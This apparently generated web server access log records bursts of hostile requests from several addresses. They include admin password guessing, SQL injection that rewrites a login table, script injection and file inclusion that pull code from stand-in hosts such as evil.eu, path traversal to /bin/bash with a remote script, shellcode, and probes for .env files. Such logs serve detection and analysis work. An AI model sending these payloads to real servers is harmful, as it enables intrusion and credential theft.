62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 72310 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 30909 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 25100 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 13611 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
87.251.81.179 - - [18/May/2019:03:26:25 +0200] "GET /?username=admin&password=1236 HTTP/1.0" 403 56561 "/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
121.225.26.201 - - [18/May/2019:03:26:26 +0200] "GET /login.php/?username=admin&password=1236 HTTP/1.0" 200 71031 "/update.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:26:27 +0200] "GET /api/v1/customers/?username=admin&password=admin HTTP/1.1" 200 84734 "/authorize.php/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
115.221.121.44 - - [18/May/2019:03:26:28 +0200] "GET /api/v1/login/?post=%3script%3ealert(1); HTTP/1.1" 200 19902 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:26:29 +0200] "GET /index.php/?username=admin&password=1235 HTTP/1.0" 404 44323 "/register.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:26:30 +0200] "GET /core/files/js/editor.js/.well-known/assetlinks.json HTTP/1.1" 200 86118 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:26:31 +0200] "GET /xmlrpc.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.1" 200 74263 "/index.php/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:26:32 +0200] "GET /index.php/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 404 26792 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 OPR/30.1835.49 (Edition beta)"
87.251.81.179 - - [18/May/2019:03:26:33 +0200] "POST /api/v1/register/ HTTP/1.0" 200 2681 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:26:34 +0200] "GET /index.php/ HTTP/1.0" 200 19902 "/update.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:26:35 +0200] "GET /index.php/ HTTP/1.0" 200 55165 "/api/v1/orders/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
121.225.26.201 - - [18/May/2019:03:26:36 +0200] "GET /update.php/ HTTP/1.0" 403 83083 "/index.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
209.133.212.79 - - [18/May/2019:03:26:37 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 46304 "/login.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
45.61.164.120 - - [18/May/2019:03:26:38 +0200] "GET /orders.php/?ip=|+ls+-l HTTP/1.1" 403 30828 "/update.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:26:39 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 200 50072 "/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
209.133.212.79 - - [18/May/2019:03:26:39 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 200 29992 "/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
209.133.212.79 - - [18/May/2019:03:26:39 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 200 35323 "/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
209.133.212.79 - - [18/May/2019:03:26:39 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 200 14871 "/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
209.133.212.79 - - [18/May/2019:03:26:39 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 200 20218 "/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
121.225.26.201 - - [18/May/2019:03:26:44 +0200] "GET /login.php/.env/README.txt HTTP/1.0" 200 13153 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:26:45 +0200] "GET /api/v1/orders/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 60709 "/authorize.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11"
182.34.27.162 - - [18/May/2019:03:26:46 +0200] "GET / HTTP/1.0" 404 1706 "/api/v1/customers/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
182.34.27.162 - - [18/May/2019:03:26:46 +0200] "GET / HTTP/1.0" 404 87624 "/api/v1/customers/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
182.34.27.162 - - [18/May/2019:03:26:46 +0200] "GET / HTTP/1.0" 404 60591 "/api/v1/customers/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
182.34.27.162 - - [18/May/2019:03:26:46 +0200] "GET / HTTP/1.0" 404 59121 "/api/v1/customers/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
182.34.27.162 - - [18/May/2019:03:26:46 +0200] "GET / HTTP/1.0" 404 21882 "/api/v1/customers/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
54.36.149.94 - - [18/May/2019:03:26:51 +0200] "GET /login.php/?username=admin&password=admin HTTP/1.0" 200 42604 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:26:52 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 52886 "/core/themes/theme.inc/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
182.34.27.162 - - [18/May/2019:03:26:53 +0200] "GET /orders.php/?id=0%20or%201=1 HTTP/1.0" 504 24771 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:26:54 +0200] "GET /index.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1" 200 15315 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:26:54 +0200] "GET /index.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1" 200 21956 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:26:54 +0200] "GET /index.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1" 200 44376 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:26:54 +0200] "GET /index.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1" 200 68003 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:26:54 +0200] "GET /index.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1" 200 53650 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:26:59 +0200] "GET /index.php/?post=%3script%3ealert(1); HTTP/1.0" 200 25823 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
115.221.121.44 - - [18/May/2019:03:27:00 +0200] "GET /index.php/ HTTP/1.1" 403 43980 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
91.138.198.224 - - [18/May/2019:03:27:01 +0200] "GET / HTTP/1.0" 404 3748 "/api/v1/register/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:27:02 +0200] "GET /api/v1/login/?post=%3script%3ealert(1); HTTP/1.0" 200 35191 "/page/about-us/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
115.221.121.44 - - [18/May/2019:03:27:03 +0200] "GET /?file=http://evil.eu/sh HTTP/1.0" 200 9099 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
87.251.81.179 - - [18/May/2019:03:27:04 +0200] "GET /index.php/ HTTP/1.1" 404 84655 "/index.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:27:05 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 68943 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
87.251.81.179 - - [18/May/2019:03:27:06 +0200] "GET /api/v1/login/ HTTP/1.0" 200 82211 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
220.243.135.5 - - [18/May/2019:03:27:07 +0200] "GET /api/v1/login/ HTTP/1.0" 403 38044 "/connection.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
69.46.0.142 - - [18/May/2019:03:27:08 +0200] "GET /index.php/?username=admin&password=1234 HTTP/1.0" 503 10607 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:27:09 +0200] "GET /index.php/ HTTP/1.0" 200 9944 "/api/v1/register/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:27:10 +0200] "GET /register.php/?username=admin&password=1236 HTTP/1.0" 404 86889 "/index.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:27:11 +0200] "POST /orders.php/?file=http://evil.eu/sh HTTP/1.0" 403 18219 "/login.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:27:12 +0200] "GET /index.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 53775 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:27:13 +0200] "GET /api/v1/login/?file=http://evil.eu/sh HTTP/1.0" 200 30908 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:27:14 +0200] "GET /api/v1/customers/?file=http://evil.eu/sh HTTP/1.0" 200 4592 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
121.225.26.201 - - [18/May/2019:03:27:15 +0200] "POST /api/v1/orders/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 200 43859 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
121.225.26.201 - - [18/May/2019:03:27:15 +0200] "POST /api/v1/orders/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 200 26572 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
121.225.26.201 - - [18/May/2019:03:27:15 +0200] "POST /api/v1/orders/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 200 44377 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
121.225.26.201 - - [18/May/2019:03:27:15 +0200] "POST /api/v1/orders/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 200 722 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
121.225.26.201 - - [18/May/2019:03:27:15 +0200] "POST /api/v1/orders/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 200 62361 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
87.251.81.179 - - [18/May/2019:03:27:20 +0200] "GET /core/files/js/upload.js/?username=admin&password=1234 HTTP/1.0" 403 5902 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:27:21 +0200] "GET /update.php/?username=admin&password=1235 HTTP/1.0" 404 76268 "/index.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:27:22 +0200] "GET /index.php/?ip=|+ls+-l HTTP/1.0" 404 41633 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:27:23 +0200] "POST /?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 46626 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
209.133.212.79 - - [18/May/2019:03:27:24 +0200] "GET /api/v1/orders/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.1" 404 77601 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
39.36.99.88 - - [18/May/2019:03:27:25 +0200] "GET /api/v1/customers/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git HTTP/1.0" 200 24414 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:27:26 +0200] "GET /core/files/js/upload.js/ HTTP/1.0" 200 25454 "/index.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
87.251.81.179 - - [18/May/2019:03:27:27 +0200] "GET /register.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 69454 "/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
87.251.81.179 - - [18/May/2019:03:27:28 +0200] "GET /api/v1/register/.well-known/assetlinks.json HTTP/1.0" 200 78203 "/index.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:27:29 +0200] "GET /api/v1/register/?post=%3script%3ealert(1); HTTP/1.0" 503 80559 "/index.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
31.184.238.22 - - [18/May/2019:03:27:30 +0200] "GET /index.php/?file=http://evil.eu/sh HTTP/1.0" 200 2302 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
39.36.99.88 - - [18/May/2019:03:27:31 +0200] "GET /update.php/?username=admin&password=1234 HTTP/1.0" 504 12039 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
87.251.81.179 - - [18/May/2019:03:27:32 +0200] "GET /update.php/ HTTP/1.0" 200 32268 "/update.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:27:33 +0200] "GET /index.php/?username=admin&password=password HTTP/1.0" 400 20734 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:27:34 +0200] "GET /register.php/?file=http://evil.eu/sh HTTP/1.0" 200 7252 "/login.php/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
87.251.81.179 - - [18/May/2019:03:27:35 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 404 16499 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:27:36 +0200] "GET /orders.php/.env/README.txt HTTP/1.0" 403 65916 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
69.46.0.142 - - [18/May/2019:03:27:37 +0200] "GET /api/v1/orders/?file=http://evil.eu/sh HTTP/1.0" 200 63384 "/register.php/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
209.133.212.79 - - [18/May/2019:03:27:38 +0200] "GET /api/v1/orders/?username=admin&password=1238 HTTP/1.0" 200 79994 "/orders.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:27:39 +0200] "GET /api/v1/orders/?post=%3script%3ealert(1); HTTP/1.0" 200 49755 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
75.140.82.208 - - [18/May/2019:03:27:40 +0200] "POST /register.php/?username=admin&password=1239 HTTP/1.1" 200 47987 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:27:41 +0200] "GET /core/files/js/upload.js/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 404 15357 "/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
220.243.135.5 - - [18/May/2019:03:27:42 +0200] "GET /api/v1/register/.env/README.txt HTTP/1.1" 503 63902 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
115.221.121.44 - - [18/May/2019:03:27:43 +0200] "GET /api/v1/orders/?username=admin&password=admin2 HTTP/1.0" 200 24990 "/api/v1/register/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.36.79.144 - - [18/May/2019:03:27:44 +0200] "GET /register.php/?username=admin&password=admin2 HTTP/1.0" 200 44289 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
69.46.0.142 - - [18/May/2019:03:27:45 +0200] "GET /?username=admin&password=1235 HTTP/1.0" 200 75847 "/api/v1/register/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:27:46 +0200] "GET /core/files/js/upload.js/?post=%3script%3ealert(1); HTTP/1.1" 200 16609 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:27:47 +0200] "GET /login.php/?file=http://evil.eu/sh HTTP/1.0" 404 89173 "/api/v1/orders/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:27:48 +0200] "GET /connection.php/?username=admin&password=1234 HTTP/1.0" 200 25999 "/login.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:27:49 +0200] "GET /index.php/?username=admin&password=1236 HTTP/1.0" 200 8132 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:27:50 +0200] "POST /api/v1/customers/?username=admin&password=1235 HTTP/1.0" 200 33524 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:27:51 +0200] "GET /index.php/ HTTP/1.0" 200 24006 "/orders.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
86.125.112.230 - - [18/May/2019:03:27:52 +0200] "GET / HTTP/1.0" 200 64252 "/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:27:53 +0200] "GET /login.php/?username=admin&password=1237 HTTP/1.1" 200 19082 "/index.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:27:54 +0200] "GET / HTTP/1.0" 404 54122 "/connection.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:27:55 +0200] "GET /xmlrpc.php/ HTTP/1.0" 200 31450 "/register.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [18/May/2019:03:27:56 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.0" 200 50284 "/api/v1/login/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
87.251.81.179 - - [18/May/2019:03:27:57 +0200] "GET /xmlrpc.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.1" 200 55726 "/api/v1/orders/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
62.109.16.162 - - [18/May/2019:03:27:58 +0200] "GET /core/files/js/upload.js/?username=admin&password=1239 HTTP/1.1" 200 85497 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:27:59 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 404 68223 "/blog/better-products-for-2019/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
45.61.164.120 - - [18/May/2019:03:28:00 +0200] "GET /?session=vwdefcwec334scfdjr49ccededfewsd HTTP/1.0" 200 37430 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
